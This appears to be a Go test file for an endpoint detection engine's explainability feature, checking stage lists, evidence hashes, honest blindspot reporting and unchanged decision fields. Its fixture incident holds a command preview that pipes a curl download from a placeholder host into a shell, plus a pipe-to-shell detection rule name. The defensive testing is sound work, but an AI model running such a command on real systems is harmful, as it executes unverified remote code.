// STATUS: DIAMANT VGT SUPREME
package main

// V6.3.0 AP-7: mandatory explainability test corpus.
//
// Proves completeness on representative findings, honesty of the capability /
// blindspot fields (only genuinely known conditions are named) and that the
// enrichment never mutates a decision field byte-for-byte.

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"
	"time"
)

func explainabilityTestIncident() XDRIncident {
	return XDRIncident{
		ID: "incident-explainability", Time: time.Date(2026, 11, 24, 12, 30, 0, 0, time.UTC),
		Severity: "high", Score: 140, ResponseScore: 130, KillSignals: 2,
		PID: 4321, PPID: 1, StartTicks: 99, UID: 1000,
		Process: "curl", Executable: "/usr/bin/curl", Parent: "/bin/bash",
		CommandPreview: "curl -s https://example.invalid | sh",
		CommandSHA256:  strings.Repeat("ab", 32), BodySHA256: strings.Repeat("cd", 32),
		RuleIDs:    []string{"KD.LINUX.PIPE_SHELL", "XDR.ANOMALY.EXEC_BURST"},
		Categories: []string{"execution", "behavior"},
		Summary:    "download piped into a shell", Decision: "kill", Action: "kill", Outcome: "terminated",
		ExecutionChainID: "chain-1",
		AttackStory:      []AttackStoryNode{{Sensor: "kernel"}, {Sensor: "network"}},
		EvidenceRoot:     strings.Repeat("ef", 32),
	}
}

func TestExplainabilityCompletenessOnRepresentativeIncidents(t *testing.T) {
	e := newAP7TestEngine(t, t.TempDir())
	e.platformCaps = PlatformCapabilities{DetectedAt: time.Now().UTC(), HasBPFLSM: false}
	incident := explainabilityTestIncident()
	incident.Permit = &PermitDecision{PermitID: strings.Repeat("12", 16), TrustLevel: permitTrustTolerated, Scope: "XDR.TEMP_EXEC", Reason: "test"}
	incident.GIEF = &GIEFEnvelope{Version: "1.0"}

	attached := e.attachFindingExplainability(incident)
	explain := attached.Explainability
	if explain == nil {
		t.Fatal("incident has no explainability block")
	}
	if len(explain.Stages) == 0 || len(explain.Stages) > 8 {
		t.Fatalf("stages missing or unbounded: %v", explain.Stages)
	}
	joined := strings.Join(explain.Stages, ",")
	for _, expected := range []string{"ingest", "rule-engine", "behavior-model", "correlation", "permit-broker", "gief-v1"} {
		if !strings.Contains(joined, expected) {
			t.Fatalf("stage %q missing from %v", expected, explain.Stages)
		}
	}
	if len(explain.Rules) != len(incident.RuleIDs) {
		t.Fatalf("rules not copied: %v", explain.Rules)
	}
	if len(explain.EvidenceHashes) == 0 {
		t.Fatal("existing evidence hashes were not carried")
	}
	for _, digest := range explain.EvidenceHashes {
		if !validEvidenceHash(digest) {
			t.Fatalf("explainability carries a non-hash value: %q", digest)
		}
	}
	if !strings.HasPrefix(explain.CapabilityStatus, "nominal") {
		t.Fatalf("unexpected capability status: %q", explain.CapabilityStatus)
	}
	if !strings.Contains(explain.ExoneratingEvidenceHint, incident.Permit.PermitID) {
		t.Fatalf("permit context missing from exonerating hint: %q", explain.ExoneratingEvidenceHint)
	}
	if len(explain.Blindspots) == 0 || !strings.Contains(strings.Join(explain.Blindspots, ","), "BPF-LSM") {
		t.Fatalf("known BPF-LSM blindspot not reported: %v", explain.Blindspots)
	}

	// A plain finding gets a hint even without a permit: either a profile hint or
	// an honest "no correlation" statement.
	plain := explainabilityTestIncident()
	plain.ExecutionChainID = ""
	plain.AttackStory = nil
	plain.RuleIDs = []string{"KD.LINUX.PIPE_SHELL"}
	plain.Categories = []string{"execution"}
	attachedPlain := e.attachFindingExplainability(plain)
	if attachedPlain.Explainability.ExoneratingEvidenceHint == "" {
		t.Fatal("plain finding has neither a benign-explanation hint nor an honest no-correlation statement")
	}
}

func TestExplainabilityDoesNotMutateDecisionFields(t *testing.T) {
	e := newAP7TestEngine(t, t.TempDir())
	e.platformCaps = PlatformCapabilities{DetectedAt: time.Now().UTC(), HasBPFLSM: true}
	incident := explainabilityTestIncident()
	before, err := json.Marshal(incident)
	if err != nil {
		t.Fatalf("marshal incident before enrich: %v", err)
	}
	attached := e.attachFindingExplainability(incident)
	if attached.Explainability == nil {
		t.Fatal("explainability block missing")
	}
	// Every decision field must be identical.
	if attached.Decision != incident.Decision || attached.Action != incident.Action ||
		attached.Score != incident.Score || attached.ResponseScore != incident.ResponseScore ||
		attached.KillSignals != incident.KillSignals || attached.Severity != incident.Severity ||
		attached.Outcome != incident.Outcome || attached.ID != incident.ID {
		t.Fatalf("explainability mutated decision fields: before=%+v after=%+v", incident, attached)
	}
	if attached.Permit != nil {
		t.Fatal("explainability invented permit metadata")
	}
	// Byte-for-byte: removing only the Explainability block restores the exact
	// pre-enrichment JSON (metadata only, no silent side effect).
	attached.Explainability = nil
	after, err := json.Marshal(attached)
	if err != nil {
		t.Fatalf("marshal incident after enrich: %v", err)
	}
	if !bytes.Equal(before, after) {
		t.Fatalf("explainability changed the incident bytes:\nbefore=%s\nafter=%s", before, after)
	}
}

func TestExplainabilityDegradedCapabilityIsHonest(t *testing.T) {
	e := newAP7TestEngine(t, t.TempDir())
	e.platformCaps = PlatformCapabilities{DetectedAt: time.Now().UTC(), HasBPFLSM: true}
	e.markDegradedCause("incident_log", "incident history could not be restored: retained budget")
	attached := e.attachFindingExplainability(explainabilityTestIncident())
	if attached.Explainability == nil {
		t.Fatal("explainability block missing")
	}
	if !strings.HasPrefix(attached.Explainability.CapabilityStatus, "degraded:") {
		t.Fatalf("degraded engine reported a healthy capability status: %q", attached.Explainability.CapabilityStatus)
	}
	if !strings.Contains(attached.Explainability.CapabilityStatus, "incident history could not be restored") {
		t.Fatalf("degraded capability status lost the concrete reason: %q", attached.Explainability.CapabilityStatus)
	}
}

func TestExplainabilityBlindspotsOnlyWhenKnown(t *testing.T) {
	e := newAP7TestEngine(t, t.TempDir())
	// Capability detection never ran: the block must say unknown, not assert a
	// blindspot the engine cannot prove.
	attached := e.attachFindingExplainability(explainabilityTestIncident())
	if attached.Explainability == nil {
		t.Fatal("explainability block missing")
	}
	blindspots := strings.Join(attached.Explainability.Blindspots, ",")
	if !strings.Contains(blindspots, "unknown") {
		t.Fatalf("undetected capabilities were not reported as unknown: %q", blindspots)
	}
	if strings.Contains(blindspots, "BPF-LSM not active") {
		t.Fatalf("engine claimed a BPF-LSM blindspot it cannot prove: %q", blindspots)
	}

	// Known capability without BPF-LSM: the blindspot is reported.
	known := newAP7TestEngine(t, t.TempDir())
	known.platformCaps = PlatformCapabilities{DetectedAt: time.Now().UTC(), HasBPFLSM: false}
	attached = known.attachFindingExplainability(explainabilityTestIncident())
	if !strings.Contains(strings.Join(attached.Explainability.Blindspots, ","), "BPF-LSM not active") {
		t.Fatalf("known BPF-LSM absence was not reported: %v", attached.Explainability.Blindspots)
	}

	// Known capability with BPF-LSM active and no StyX engine: no fabricated
	// telemetry blindspot.
	healthy := newAP7TestEngine(t, t.TempDir())
	healthy.platformCaps = PlatformCapabilities{DetectedAt: time.Now().UTC(), HasBPFLSM: true}
	attached = healthy.attachFindingExplainability(explainabilityTestIncident())
	for _, blindspot := range attached.Explainability.Blindspots {
		if strings.Contains(blindspot, "BPF-LSM") {
			t.Fatalf("healthy engine fabricated a blindspot: %q", blindspot)
		}
	}
}

func TestExplainabilityReportsRXTelemetryBlindspot(t *testing.T) {
	e := newAP7TestEngine(t, t.TempDir())
	e.platformCaps = PlatformCapabilities{DetectedAt: time.Now().UTC(), HasBPFLSM: true}
	e.styx = &StyxEngine{}
	e.styxFlowTelemetryState = styxTelemetryUnavailable
	attached := e.attachFindingExplainability(explainabilityTestIncident())
	blindspots := strings.Join(attached.Explainability.Blindspots, ",")
	if !strings.Contains(blindspots, "RX telemetry unavailable") {
		t.Fatalf("known RX telemetry outage was not reported: %q", blindspots)
	}
}
